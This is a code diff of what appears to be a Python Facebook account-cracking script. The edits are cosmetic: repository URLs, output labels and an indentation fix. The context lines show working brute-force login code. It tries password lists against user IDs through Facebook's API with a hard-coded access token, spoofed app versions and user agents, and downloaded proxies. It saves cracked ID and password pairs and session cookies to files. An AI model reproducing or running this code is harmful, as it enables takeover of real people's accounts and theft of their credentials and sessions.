@@ -18,7 +18,7 @@ except ModuleNotFoundError:
 os.system('xdg-open https://www.facebook.com/profile.php?id=100028629604446')
 
 try:
-    prox= requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/proxies.txt').text
+    prox= requests.get('https://raw.githubusercontent.com/kpk-Fire/data/main/proxies.txt').text
     open('proxies.txt','w').write(proxies)
 except Exception as e:
     print('\033[1;35mCHECKING FOR UPDATE...')
@@ -28,14 +28,14 @@ proxies=open('proxies.txt','r').read().splitlines()
 
 android_models=[]
 try:
-    xx = requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/strings.txt').text.splitlines()
+    xx = requests.get('https://raw.githubusercontent.com/kpk-Fire/data/main/strings.txt').text.splitlines()
     for line in xx:
         android_models.append(line)
 except:pass
 
 usr=[]
 try:
-    xd=requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/ua.txt').text.splitlines()
+    xd=requests.get('https://raw.githubusercontent.com/kpk-Fire/data/main/ua.txt').text.splitlines()
     for us in xd:
         usr.append(us)
 except: pass
@@ -208,7 +208,7 @@ def menu():
                         if xd in ['1','01']:
                                 clear()
                                 
-                                print(' PUT FILE EXAMPLE :  /sdcard/File.trt.etc..')
+                                print(' PUT FILE EXAMPLE :  /sdcard/File.kpk.etc..')
                                 linex()
                                 file = input(' PUT FILE PATH\033[1;37m: ')
                                 try:
@@ -362,7 +362,7 @@ def ffb(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [-KING-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [KING-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
                                         open('/sdcard/KING-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
@@ -376,7 +376,7 @@ def ffb(ids,names,passlist):
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;31m [ALONE-KING-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[1;31m [ALONEKING-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/KING-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
@@ -485,7 +485,7 @@ def api(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [-KING-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [KING-OK] '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/KING-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
@@ -496,7 +496,7 @@ def api(ids,names,passlist):
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;31m [ALONE-KING-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[1;31m [KING-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/KING-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
@@ -514,7 +514,7 @@ def api1(ids,names,passlist):
         global oks
         sys.stdout.write('\r\r\033[1;37m [KING-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
-               for pas in passlist:
+                for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                         fbbv = str(random.randint(111111111,999999999))
@@ -585,7 +585,7 @@ def api1(ids,names,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [-KING-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [KING-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
                                         open('/sdcard/KING-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
@@ -668,7 +668,7 @@ def rndm(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [-KING-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [KING-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
                                         open('/sdcard/KING-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
